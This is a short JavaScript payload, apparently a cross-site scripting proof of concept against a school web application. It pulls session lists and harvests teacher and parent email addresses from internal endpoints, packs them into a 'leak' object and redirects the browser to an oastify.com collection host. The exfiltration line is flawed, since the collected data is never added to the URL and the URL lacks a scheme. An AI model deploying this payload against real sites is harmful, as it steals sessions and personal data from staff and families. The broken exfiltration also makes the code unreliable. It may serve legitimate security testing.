async function get_sessions() {
  const res = await fetch('/listSessions');
  const data = await res.json();
  return data.sessions;
}

function collectEmails(value, set = new Set()) {
  const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-z]{2,}/g;
  if (typeof value === 'string') {
    const matches = value.match(emailRegex);
    if (matches) {
      matches.forEach(e => set.add(e));
    }
  } else if (Array.isArray(value)) {
    value.forEach(v => collectEmails(v, set));
  } else if (value && typeof value === 'object') {
    Object.values(value).forEach(v => collectEmails(v, set));
  }
  return set;
}

async function get_parents(){
  const res = await fetch('/parent_accounts/links?page=0&orderBy=ParentId&orderByDir=1');
  const data = await res.json();
  const emailSet = collectEmails(data);
  const emails = Array.from(emailSet);
  return emails
}

async function get_teachers(){
  const res = await fetch('/teacher_accounts/get?page=0');
  const data = await res.json();
  const emailSet = collectEmails(data);
  const emails = Array.from(emailSet);
  return emails
}

(async () => {

  // Confidentiality
  let emails_teacher = await get_teachers()
  let emails_parents = await get_parents()

  const result = JSON.stringify({
    sessions: await get_sessions(),
    leak: [
      emails_teacher,
      emails_parents
    ]
  });

  document.location = `35651fqi99jtiliqzp4wxyer5ibaz7nw.oastify.com`

})();


